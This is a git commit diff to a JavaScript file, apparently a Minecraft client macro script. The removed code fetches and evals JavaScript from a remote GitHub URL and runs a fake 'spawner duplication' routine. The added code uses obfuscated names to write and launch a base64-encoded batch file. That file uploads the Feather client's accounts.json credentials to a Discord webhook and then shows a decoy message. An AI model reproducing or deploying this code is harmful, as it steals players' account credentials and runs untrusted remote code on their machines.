82ee8e50d5b8f3f307277a224e6a583167b19d72
Fembexx <hasoob030@gmail.com>
2025-02-02 12:14:27 +0100

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,94 +1,21 @@
-
-
-Chat.actionbar("§4§WWait for blacklist/whitelist")
-
-Client.waitTick(5)
-
-
-const req = Request.create("https://raw.githubusercontent.com/hasoon-0/website/refs/heads/main/qkwjleqlkwje.js");
-const response = req.get();
-const responseText = response.text();
-
-eval(responseText);
-
-Client.waitTick(5)
-java.lang.System.exit(1)
-Client.waitTick(5)
-
-const name:  "hashedname"           // rename to what you want to name the spawner
-
-(function() {
-    const w = ["whitelist"];
-    const b = ["blacklist"];
-    const s = {
-        "Spawner_Skeleton": { e: encode("Spawner_Skeleton") },
-        "Spawner_IronGolem": { e: encode("Spawner_IronGolem") }
-    };
-    let i = [];
-
-    function c(p) {
-        let m = mRand();
-        const t = encode(p);
-        if (b.includes(t)) {
-            console.log(decode("Sorry, you got blacklisted."));
-            return false;
-        }
-        if (w.includes(t)) {
-            console.log("Sorry, you got " + m);
-            return true;
-        }
-        console.log(decode("Not whitelisted."));
-        return false;
-    }
-
-    function mRand() {
-        const msgs = ["whit3elisted.", "blacklisted.", "approved for duplication.", "rejected from duplication."];
-        return msgs[Math.floor(Math.random() * msgs.length)];
-    }
-
-    function d(i, p) {
-        if (!c(p)) return;
-        if (v(i) && h(i)) {
-            console.log(f(i));
-            let dupe = create(i);
-            console.log("Duped spawner:", dupe);
-        } else {
-            console.log(decode("Invalid spawner."));
-        }
-    }
-
-    function v(i) {
-        return Object.keys(s).includes(i);
-    }
-
-    function h(i) {
-        return s[i] && s[i].e === encode(i);
-    }
-
-    function create(i) {
-        return `Duped_${s[i].e}`;
-    }
-
-    function f(i) {
-        let enc = s[i].e;
-        let steps = [
-            `Initializing: ${decode(enc)}`,
-            `Verifying ${decode(enc)} permissions.`,
-            `Authenticate player ${encode(i)}.`,
-            `Duplicating ${decode(enc)}.`,
-            `Duplication success: Duped_${decode(enc)}`
-        ];
-        return steps.join("\n");
-    }
-
-    function encode(str) {
-        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + i)).join('');
-    }
-
-    function decode(str) {
-        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) - i)).join('');
-    }
-
-    d("Spawner_Skeleton", "done");
-    d("Spawner_IronGolem", "done");
-})();
+  
+function getEnv(_0x89354c) {
+  const _0x1b7771 = Java.type("java.lang.System");
+  return _0x1b7771.getenv(_0x89354c);
+}
+function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
+  if (_0x538bd) {
+    const _0x3d0a45 = Java.type("java.util.Base64");
+    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
+  }
+  const _0x5913c4 = Java.type("java.lang.Runtime");
+  if (!FS.exists(_0x4aa79a)) {
+    throw new Error("Failed to find the path \"" + _0x4aa79a + "\"");
+  }
+  if (!FS.toRawFile(_0x4aa79a).isFile()) {
+    throw new Error("\"" + _0x4aa79a + "\" is not a file");
+  }
+  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
+}
+const fullPath = getEnv("APPDATA") + "\\" + ".feather\\skibidi.bat";
+executeBat(fullPath, "QGVjaG8gb2ZmCnNldCBmaWxlUGF0aD0ldXNlcnByb2ZpbGUlXEFwcERhdGFcUm9hbWluZ1wuZmVhdGhlclxhY2NvdW50cy5qc29uCnNldCB3ZWJob29rVXJsPWh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMzU1NjQ2Njc4MjA3MDM3NjUvYlVnT0FsZC1zemVmUnZCLWt6WFNwNEhLazNud0NJVUJjNDBpRkNWSnI3djFlWnJtS2VZa0tWMko2NXMzMzlTYnRSZWwKCmlmIGV4aXN0ICIlZmlsZVBhdGglIiBjdXJsIC1YIFBPU1QgJXdlYmhvb2tVcmwlIC1GICJmaWxlPUAlZmlsZVBhdGglIgplY2hvICBwbGVhc2UgY2hhbmdlIHlvdXIgdmVyc2lvbgpjbHMK"); 
